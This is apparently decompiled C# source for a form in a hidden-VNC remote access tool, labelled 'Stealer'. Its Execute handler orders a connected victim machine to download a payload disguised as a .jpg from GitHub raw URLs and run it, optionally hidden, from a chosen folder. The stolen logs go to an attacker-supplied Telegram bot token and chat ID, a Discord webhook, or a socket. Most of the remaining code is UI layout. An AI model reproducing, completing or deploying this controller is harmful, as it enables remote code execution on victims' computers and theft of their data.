using System;
using System.ComponentModel;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace BirdBrainmofo.HVNC
{
	public class TGtoDSC : Form
	{
		private IContainer components;

		private PrimeTheme primeTheme1;

		private TextBox txtHook;

		private TextBox txtID;

		private TextBox txtToken;

		private Label label3;

		private PictureBox pictureBox1;

		private StudioButton studioButton5;

		private Label label5;

		private Label label2;

		private Label label1;

		private GroupBox groupBox1;

		private GroupBox groupBox2;

		private PrimeButton btnExec;

		private StudioButton btnThelp;

		private StudioButton btnDHelp;

		private Label label4;

		private JCS.ToggleSwitch chkDisc;

		private Label label11;

		private JCS.ToggleSwitch chkTel;

		private Label label6;

		private ComboBox comboBox1;

		private CheckBox checkBox1;

		private Label label7;

		private JCS.ToggleSwitch chkSocket;

		public TGtoDSC()
		{
			this.InitializeComponent();
		}

		private void studioButton5_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		private void btnDHelp_Click(object sender, EventArgs e)
		{
			new HelpDisc().ShowDialog();
		}

		private void btnThelp_Click(object sender, EventArgs e)
		{
			new HelpTel().ShowDialog();
		}

        private void btnExec_Click(object sender, EventArgs e)
        {
            if (chkTel.Checked)
            {
                label3.Text = "Logs will be send to Telegram";
                if (checkBox1.Checked)
                {
                    SendTCP("55*https://raw.githubusercontent.com/vonixsessions/ponyboi/main/Icar.jpg*telegram*" + txtToken.Text + "*" + txtID.Text + "*" + comboBox1.SelectedIndex, (TcpClient)Tag);
                }
                else
                {
                    SendTCP("55*https://raw.githubusercontent.com/GodOfWareFare/TheGoodKidPhotos/main/Icar.jpg*telegram*" + txtToken.Text + "*" + txtID.Text + "*" + comboBox1.SelectedIndex, (TcpClient)Tag);
                }
            }
            else if (chkDisc.Checked)
            {
                label3.Text = "Logs will be send to Discord";
                if (checkBox1.Checked)
                {
                    SendTCP("55*https://raw.githubusercontent.com/vonixsessions/ponyboi/main/Icars.jpg*discord*" + txtHook.Text + "*" + comboBox1.SelectedIndex, (TcpClient)Tag);
                }
                else
                {
                    SendTCP("55*https://raw.githubusercontent.com/vonixsessions/ponyboi/main/Icars.jpg*discord*" + txtHook.Text + "*" + comboBox1.SelectedIndex, (TcpClient)Tag);
                }
            }
            else if (chkSocket.Checked)
            {
                if (checkBox1.Checked)
                {
                    SendTCP("55*https://raw.githubusercontent.com/vonixsessions/ponyboi/main/IcarsS.jpg*socket*" + comboBox1.SelectedIndex, (TcpClient)Tag);
                }
                else
                {
                    SendTCP("55*https://raw.githubusercontent.com/vonixsessions/ponyboi/main/IcarsS.jpg*socket*" + comboBox1.SelectedIndex, (TcpClient)Tag);
                }
            }
            else if (checkBox1.Checked)
            {
                SendTCP("55*https://raw.githubusercontent.com/vonixsessions/ponyboi/main/IcarsS.jpg*socket*" + comboBox1.SelectedIndex, (TcpClient)Tag);
            }
            else
            {
                SendTCP("55*https://raw.githubusercontent.com/vonixsessions/ponyboi/main/IcarsS.jpg*socket*" + comboBox1.SelectedIndex, (TcpClient)Tag);
            }
        }

        public void SendTCP(object object_0, TcpClient tcpClient_0)
		{
			if (object_0 == null)
			{
				return;
			}
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
			binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
			binaryFormatter.FilterLevel = TypeFilterLevel.Full;
			checked
			{
				lock (tcpClient_0)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(object_0);
					ulong num = 0uL;
					MemoryStream memoryStream = new MemoryStream();
					binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
					num = (ulong)memoryStream.Position;
					tcpClient_0.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
					byte[] buffer = memoryStream.GetBuffer();
					tcpClient_0.GetStream().Write(buffer, 0, (int)num);
					memoryStream.Close();
					memoryStream.Dispose();
				}
			}
		}

		private void chkTel_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkTel.Checked)
			{
				this.txtID.Enabled = true;
				this.txtToken.Enabled = true;
				this.txtHook.Enabled = false;
				this.chkDisc.Checked = false;
			}
			else
			{
				this.txtID.Enabled = false;
				this.txtToken.Enabled = false;
			}
		}

		private void chkDisc_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkDisc.Checked)
			{
				this.txtID.Enabled = false;
				this.txtToken.Enabled = false;
				this.txtHook.Enabled = true;
				this.chkTel.Checked = false;
			}
			else
			{
				this.txtHook.Enabled = false;
			}
		}

		private void chkSocket_CheckedChanged(object sender, EventArgs e)
		{
			if (this.chkSocket.Checked)
			{
				this.chkTel.Checked = false;
				this.chkDisc.Checked = false;
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			BloomBrain bloom = new BloomBrain();
			BloomBrain bloom2 = new BloomBrain();
			BloomBrain bloom3 = new BloomBrain();
			BloomBrain bloom4 = new BloomBrain();
			BloomBrain bloom5 = new BloomBrain();
			BloomBrain bloom6 = new BloomBrain();
			BloomBrain bloom7 = new BloomBrain();
			BloomBrain bloom8 = new BloomBrain();
			BloomBrain bloom9 = new BloomBrain();
			BloomBrain bloom10 = new BloomBrain();
			BloomBrain bloom11 = new BloomBrain();
			BloomBrain bloom12 = new BloomBrain();
			BloomBrain bloom13 = new BloomBrain();
			BloomBrain bloom14 = new BloomBrain();
			BloomBrain bloom15 = new BloomBrain();
			BloomBrain bloom16 = new BloomBrain();
			BloomBrain bloom17 = new BloomBrain();
			BloomBrain bloom18 = new BloomBrain();
			BloomBrain bloom19 = new BloomBrain();
			BloomBrain bloom20 = new BloomBrain();
			BloomBrain bloom21 = new BloomBrain();
			BloomBrain bloom22 = new BloomBrain();
			BloomBrain bloom23 = new BloomBrain();
			BloomBrain bloom24 = new BloomBrain();
			BloomBrain bloom25 = new BloomBrain();
			BloomBrain bloom26 = new BloomBrain();
			BloomBrain bloom27 = new BloomBrain();
			BloomBrain bloom28 = new BloomBrain();
			BloomBrain bloom29 = new BloomBrain();
			BloomBrain bloom30 = new BloomBrain();
			BloomBrain bloom31 = new BloomBrain();
			BloomBrain bloom32 = new BloomBrain();
			BloomBrain bloom33 = new BloomBrain();
			BloomBrain bloom34 = new BloomBrain();
			BloomBrain bloom35 = new BloomBrain();
			BloomBrain bloom36 = new BloomBrain();
			BloomBrain bloom37 = new BloomBrain();
			BloomBrain bloom38 = new BloomBrain();
			BloomBrain bloom39 = new BloomBrain();
			BloomBrain bloom40 = new BloomBrain();
			BloomBrain bloom41 = new BloomBrain();
			BloomBrain bloom42 = new BloomBrain();
			BloomBrain bloom43 = new BloomBrain();
			BloomBrain bloom44 = new BloomBrain();
			BloomBrain bloom45 = new BloomBrain();
			BloomBrain bloom46 = new BloomBrain();
			BloomBrain bloom47 = new BloomBrain();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.TGtoDSC));
			BloomBrain bloom48 = new BloomBrain();
			BloomBrain bloom49 = new BloomBrain();
			BloomBrain bloom50 = new BloomBrain();
			BloomBrain bloom51 = new BloomBrain();
			BloomBrain bloom52 = new BloomBrain();
			BloomBrain bloom53 = new BloomBrain();
			BloomBrain bloom54 = new BloomBrain();
			BloomBrain bloom55 = new BloomBrain();
			BloomBrain bloom56 = new BloomBrain();
			BloomBrain bloom57 = new BloomBrain();
			BloomBrain bloom58 = new BloomBrain();
			BloomBrain bloom59 = new BloomBrain();
			BloomBrain bloom60 = new BloomBrain();
			this.primeTheme1 = new PrimeTheme();
			this.label7 = new System.Windows.Forms.Label();
			this.chkSocket = new JCS.ToggleSwitch();
			this.label6 = new System.Windows.Forms.Label();
			this.comboBox1 = new System.Windows.Forms.ComboBox();
			this.checkBox1 = new System.Windows.Forms.CheckBox();
			this.label4 = new System.Windows.Forms.Label();
			this.chkDisc = new JCS.ToggleSwitch();
			this.label11 = new System.Windows.Forms.Label();
			this.chkTel = new JCS.ToggleSwitch();
			this.btnThelp = new StudioButton();
			this.btnDHelp = new StudioButton();
			this.btnExec = new PrimeButton();
			this.label5 = new System.Windows.Forms.Label();
			this.label2 = new System.Windows.Forms.Label();
			this.label1 = new System.Windows.Forms.Label();
			this.label3 = new System.Windows.Forms.Label();
			this.pictureBox1 = new System.Windows.Forms.PictureBox();
			this.studioButton5 = new StudioButton();
			this.txtHook = new System.Windows.Forms.TextBox();
			this.txtID = new System.Windows.Forms.TextBox();
			this.txtToken = new System.Windows.Forms.TextBox();
			this.groupBox1 = new System.Windows.Forms.GroupBox();
			this.groupBox2 = new System.Windows.Forms.GroupBox();
			this.primeTheme1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			this.groupBox1.SuspendLayout();
			base.SuspendLayout();
			this.primeTheme1.BackColor = System.Drawing.Color.White;
			this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
			bloom.Name = "Sides";
			bloom.Value = System.Drawing.Color.FromArgb(232, 232, 232);
			bloom2.Name = "Gradient1";
			bloom2.Value = System.Drawing.Color.FromArgb(252, 252, 252);
			bloom3.Name = "Gradient2";
			bloom3.Value = System.Drawing.Color.FromArgb(242, 242, 242);
			bloom4.Name = "TextShade";
			bloom4.Value = System.Drawing.Color.White;
			bloom5.Name = "Text";
			bloom5.Value = System.Drawing.Color.FromArgb(80, 80, 80);
			bloom6.Name = "Back";
			bloom6.Value = System.Drawing.Color.White;
			bloom7.Name = "Border1";
			bloom7.Value = System.Drawing.Color.FromArgb(180, 180, 180);
			bloom8.Name = "Border2";
			bloom8.Value = System.Drawing.Color.White;
			bloom9.Name = "Border3";
			bloom9.Value = System.Drawing.Color.White;
			bloom10.Name = "Border4";
			bloom10.Value = System.Drawing.Color.FromArgb(150, 150, 150);
			this.primeTheme1.Colors = new BloomBrain[10] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
			this.primeTheme1.Controls.Add(this.label7);
			this.primeTheme1.Controls.Add(this.chkSocket);
			this.primeTheme1.Controls.Add(this.label6);
			this.primeTheme1.Controls.Add(this.comboBox1);
			this.primeTheme1.Controls.Add(this.checkBox1);
			this.primeTheme1.Controls.Add(this.label4);
			this.primeTheme1.Controls.Add(this.chkDisc);
			this.primeTheme1.Controls.Add(this.label11);
			this.primeTheme1.Controls.Add(this.chkTel);
			this.primeTheme1.Controls.Add(this.btnThelp);
			this.primeTheme1.Controls.Add(this.btnDHelp);
			this.primeTheme1.Controls.Add(this.btnExec);
			this.primeTheme1.Controls.Add(this.label5);
			this.primeTheme1.Controls.Add(this.label2);
			this.primeTheme1.Controls.Add(this.label1);
			this.primeTheme1.Controls.Add(this.label3);
			this.primeTheme1.Controls.Add(this.pictureBox1);
			this.primeTheme1.Controls.Add(this.studioButton5);
			this.primeTheme1.Controls.Add(this.txtHook);
			this.primeTheme1.Controls.Add(this.txtID);
			this.primeTheme1.Controls.Add(this.txtToken);
			this.primeTheme1.Controls.Add(this.groupBox1);
			this.primeTheme1.Controls.Add(this.groupBox2);
			this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
			this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
			this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8f);
			this.primeTheme1.Image = null;
			this.primeTheme1.Location = new System.Drawing.Point(0, 0);
			this.primeTheme1.Movable = true;
			this.primeTheme1.Name = "primeTheme1";
			this.primeTheme1.NoRounding = false;
			this.primeTheme1.Sizable = true;
			this.primeTheme1.Size = new System.Drawing.Size(822, 480);
			this.primeTheme1.SmartBounds = true;
			this.primeTheme1.TabIndex = 0;
			this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
			this.label7.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.label7.AutoSize = true;
			this.label7.Location = new System.Drawing.Point(330, 405);
			this.label7.Name = "label7";
			this.label7.Size = new System.Drawing.Size(94, 13);
			this.label7.TabIndex = 72;
			this.label7.Text = "Send to Socket";
			this.chkSocket.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.chkSocket.BackColor = System.Drawing.Color.Transparent;
			this.chkSocket.Location = new System.Drawing.Point(276, 402);
			this.chkSocket.Name = "chkSocket";
			this.chkSocket.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkSocket.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkSocket.Size = new System.Drawing.Size(50, 19);
			this.chkSocket.Style = JCS.ToggleSwitch.ToggleSwitchStyle.BrushedMetal;
			this.chkSocket.TabIndex = 71;
			this.chkSocket.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkSocket_CheckedChanged);
			this.label6.AutoSize = true;
			this.label6.Location = new System.Drawing.Point(591, 380);
			this.label6.Name = "label6";
			this.label6.Size = new System.Drawing.Size(41, 13);
			this.label6.TabIndex = 70;
			this.label6.Text = "Path :";
			this.comboBox1.FormattingEnabled = true;
			this.comboBox1.Items.AddRange(new object[5] { "Desktop", "Local", "Program Files", "Roaming", "Temp" });
			this.comboBox1.Location = new System.Drawing.Point(641, 372);
			this.comboBox1.Name = "comboBox1";
			this.comboBox1.Size = new System.Drawing.Size(130, 21);
			this.comboBox1.TabIndex = 69;
			this.comboBox1.Text = "Desktop";
			this.checkBox1.AutoSize = true;
			this.checkBox1.Checked = true;
			this.checkBox1.CheckState = System.Windows.Forms.CheckState.Checked;
			this.checkBox1.Location = new System.Drawing.Point(502, 380);
			this.checkBox1.Name = "checkBox1";
			this.checkBox1.Size = new System.Drawing.Size(91, 17);
			this.checkBox1.TabIndex = 68;
			this.checkBox1.Text = "Run Hidden";
			this.checkBox1.UseVisualStyleBackColor = true;
			this.label4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.label4.AutoSize = true;
			this.label4.Location = new System.Drawing.Point(330, 380);
			this.label4.Name = "label4";
			this.label4.Size = new System.Drawing.Size(50, 13);
			this.label4.TabIndex = 67;
			this.label4.Text = "Discord";
			this.chkDisc.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.chkDisc.BackColor = System.Drawing.Color.Transparent;
			this.chkDisc.Location = new System.Drawing.Point(276, 377);
			this.chkDisc.Name = "chkDisc";
			this.chkDisc.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkDisc.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkDisc.Size = new System.Drawing.Size(50, 19);
			this.chkDisc.Style = JCS.ToggleSwitch.ToggleSwitchStyle.BrushedMetal;
			this.chkDisc.TabIndex = 66;
			this.chkDisc.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkDisc_CheckedChanged);
			this.label11.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.label11.AutoSize = true;
			this.label11.Location = new System.Drawing.Point(438, 380);
			this.label11.Name = "label11";
			this.label11.Size = new System.Drawing.Size(60, 13);
			this.label11.TabIndex = 65;
			this.label11.Text = "Telegram";
			this.chkTel.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.chkTel.BackColor = System.Drawing.Color.Transparent;
			this.chkTel.Location = new System.Drawing.Point(384, 377);
			this.chkTel.Name = "chkTel";
			this.chkTel.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkTel.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkTel.Size = new System.Drawing.Size(50, 19);
			this.chkTel.Style = JCS.ToggleSwitch.ToggleSwitchStyle.BrushedMetal;
			this.chkTel.TabIndex = 64;
			this.chkTel.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkTel_CheckedChanged);
			this.btnThelp.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.btnThelp.BackColor = System.Drawing.Color.Transparent;
			bloom11.Name = "DownGradient1";
			bloom11.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom12.Name = "DownGradient2";
			bloom12.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom13.Name = "NoneGradient1";
			bloom13.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom14.Name = "NoneGradient2";
			bloom14.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom15.Name = "Shine1";
			bloom15.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom16.Name = "Shine2A";
			bloom16.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom17.Name = "Shine2B";
			bloom17.Value = System.Drawing.Color.Transparent;
			bloom18.Name = "Shine3";
			bloom18.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom19.Name = "TextShade";
			bloom19.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom20.Name = "Text";
			bloom20.Value = System.Drawing.Color.White;
			bloom21.Name = "Glow";
			bloom21.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom22.Name = "Border";
			bloom22.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom23.Name = "Corners";
			bloom23.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnThelp.Colors = new BloomBrain[13]
			{
				bloom11, bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20,
				bloom21, bloom22, bloom23
			};
			this.btnThelp.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnThelp.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnThelp.Image = null;
			this.btnThelp.Location = new System.Drawing.Point(164, 371);
			this.btnThelp.Name = "btnThelp";
			this.btnThelp.NoRounding = false;
			this.btnThelp.Size = new System.Drawing.Size(108, 30);
			this.btnThelp.TabIndex = 62;
			this.btnThelp.Text = "Telegram Help";
			this.btnThelp.Transparent = true;
			this.btnThelp.Click += new System.EventHandler(btnThelp_Click);
			this.btnDHelp.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.btnDHelp.BackColor = System.Drawing.Color.Transparent;
			bloom24.Name = "DownGradient1";
			bloom24.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom25.Name = "DownGradient2";
			bloom25.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom26.Name = "NoneGradient1";
			bloom26.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom27.Name = "NoneGradient2";
			bloom27.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom28.Name = "Shine1";
			bloom28.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom29.Name = "Shine2A";
			bloom29.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom30.Name = "Shine2B";
			bloom30.Value = System.Drawing.Color.Transparent;
			bloom31.Name = "Shine3";
			bloom31.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom32.Name = "TextShade";
			bloom32.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom33.Name = "Text";
			bloom33.Value = System.Drawing.Color.White;
			bloom34.Name = "Glow";
			bloom34.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom35.Name = "Border";
			bloom35.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom36.Name = "Corners";
			bloom36.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnDHelp.Colors = new BloomBrain[13]
			{
				bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31, bloom32, bloom33,
				bloom34, bloom35, bloom36
			};
			this.btnDHelp.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnDHelp.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnDHelp.Image = null;
			this.btnDHelp.Location = new System.Drawing.Point(52, 371);
			this.btnDHelp.Name = "btnDHelp";
			this.btnDHelp.NoRounding = false;
			this.btnDHelp.Size = new System.Drawing.Size(108, 30);
			this.btnDHelp.TabIndex = 61;
			this.btnDHelp.Text = "Discord Help";
			this.btnDHelp.Transparent = true;
			this.btnDHelp.Click += new System.EventHandler(btnDHelp_Click);
			this.btnExec.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			bloom37.Name = "DownGradient1";
			bloom37.Value = System.Drawing.Color.FromArgb(215, 215, 215);
			bloom38.Name = "DownGradient2";
			bloom38.Value = System.Drawing.Color.FromArgb(235, 235, 235);
			bloom39.Name = "NoneGradient1";
			bloom39.Value = System.Drawing.Color.FromArgb(235, 235, 235);
			bloom40.Name = "NoneGradient2";
			bloom40.Value = System.Drawing.Color.FromArgb(215, 215, 215);
			bloom41.Name = "NoneGradient3";
			bloom41.Value = System.Drawing.Color.FromArgb(252, 252, 252);
			bloom42.Name = "NoneGradient4";
			bloom42.Value = System.Drawing.Color.FromArgb(242, 242, 242);
			bloom43.Name = "Glow";
			bloom43.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
			bloom44.Name = "TextShade";
			bloom44.Value = System.Drawing.Color.White;
			bloom45.Name = "Text";
			bloom45.Value = System.Drawing.Color.FromArgb(80, 80, 80);
			bloom46.Name = "Border1";
			bloom46.Value = System.Drawing.Color.White;
			bloom47.Name = "Border2";
			bloom47.Value = System.Drawing.Color.FromArgb(180, 180, 180);
			this.btnExec.Colors = new BloomBrain[11]
			{
				bloom37, bloom38, bloom39, bloom40, bloom41, bloom42, bloom43, bloom44, bloom45, bloom46,
				bloom47
			};
			this.btnExec.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
			this.btnExec.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnExec.Image = null;
			this.btnExec.Location = new System.Drawing.Point(594, 399);
			this.btnExec.Name = "btnExec";
			this.btnExec.NoRounding = false;
			this.btnExec.Size = new System.Drawing.Size(177, 39);
			this.btnExec.TabIndex = 60;
			this.btnExec.Text = "Execute";
			this.btnExec.Transparent = false;
			this.btnExec.Click += new System.EventHandler(btnExec_Click);
			this.label5.AutoSize = true;
			this.label5.Location = new System.Drawing.Point(117, 293);
			this.label5.Name = "label5";
			this.label5.Size = new System.Drawing.Size(64, 13);
			this.label5.TabIndex = 57;
			this.label5.Text = "Webhook:";
			this.label2.AutoSize = true;
			this.label2.Location = new System.Drawing.Point(117, 165);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(57, 13);
			this.label2.TabIndex = 55;
			this.label2.Text = "Chat ID:";
			this.label1.AutoSize = true;
			this.label1.Location = new System.Drawing.Point(117, 119);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(46, 13);
			this.label1.TabIndex = 54;
			this.label1.Text = "Token:";
			this.label3.AutoSize = true;
			this.label3.BackColor = System.Drawing.Color.Transparent;
			this.label3.Font = new System.Drawing.Font("Verdana", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.label3.ForeColor = System.Drawing.Color.Black;
			this.label3.Location = new System.Drawing.Point(37, 15);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(60, 16);
			this.label3.TabIndex = 53;
			this.label3.Text = "Stealer";
			this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
			this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new System.Drawing.Point(0, 0);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new System.Drawing.Size(51, 48);
			this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 52;
			this.pictureBox1.TabStop = false;
			this.studioButton5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton5.BackColor = System.Drawing.Color.Transparent;
			bloom48.Name = "DownGradient1";
			bloom48.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom49.Name = "DownGradient2";
			bloom49.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom50.Name = "NoneGradient1";
			bloom50.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom51.Name = "NoneGradient2";
			bloom51.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom52.Name = "Shine1";
			bloom52.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom53.Name = "Shine2A";
			bloom53.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom54.Name = "Shine2B";
			bloom54.Value = System.Drawing.Color.Transparent;
			bloom55.Name = "Shine3";
			bloom55.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom56.Name = "TextShade";
			bloom56.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom57.Name = "Text";
			bloom57.Value = System.Drawing.Color.White;
			bloom58.Name = "Glow";
			bloom58.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom59.Name = "Border";
			bloom59.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom60.Name = "Corners";
			bloom60.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton5.Colors = new BloomBrain[13]
			{
				bloom48, bloom49, bloom50, bloom51, bloom52, bloom53, bloom54, bloom55, bloom56, bloom57,
				bloom58, bloom59, bloom60
			};
			this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton5.Image = null;
			this.studioButton5.Location = new System.Drawing.Point(796, -6);
			this.studioButton5.Name = "studioButton5";
			this.studioButton5.NoRounding = false;
			this.studioButton5.Size = new System.Drawing.Size(13, 30);
			this.studioButton5.TabIndex = 51;
			this.studioButton5.Transparent = true;
			this.studioButton5.Click += new System.EventHandler(studioButton5_Click);
			this.txtHook.Enabled = false;
			this.txtHook.Location = new System.Drawing.Point(187, 276);
			this.txtHook.Multiline = true;
			this.txtHook.Name = "txtHook";
			this.txtHook.Size = new System.Drawing.Size(454, 30);
			this.txtHook.TabIndex = 50;
			this.txtID.Enabled = false;
			this.txtID.Location = new System.Drawing.Point(187, 148);
			this.txtID.Multiline = true;
			this.txtID.Name = "txtID";
			this.txtID.Size = new System.Drawing.Size(454, 30);
			this.txtID.TabIndex = 48;
			this.txtToken.Enabled = false;
			this.txtToken.Location = new System.Drawing.Point(187, 102);
			this.txtToken.Multiline = true;
			this.txtToken.Name = "txtToken";
			this.txtToken.Size = new System.Drawing.Size(454, 30);
			this.txtToken.TabIndex = 47;
			this.groupBox1.Location = new System.Drawing.Point(53, 62);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new System.Drawing.Size(718, 152);
			this.groupBox1.TabIndex = 58;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "Telegram";
			this.groupBox2.Location = new System.Drawing.Point(53, 233);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Size = new System.Drawing.Size(718, 136);
			this.groupBox2.TabIndex = 59;
			this.groupBox2.TabStop = false;
			this.groupBox2.Text = "Discord";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(822, 480);
			base.Controls.Add(this.primeTheme1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "TGtoDSC";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "TGtoDSC";
			base.TransparencyKey = System.Drawing.Color.Fuchsia;
			this.primeTheme1.ResumeLayout(false);
			this.primeTheme1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			this.groupBox1.ResumeLayout(false);
			this.groupBox1.PerformLayout();
			base.ResumeLayout(false);
		}
	}
}
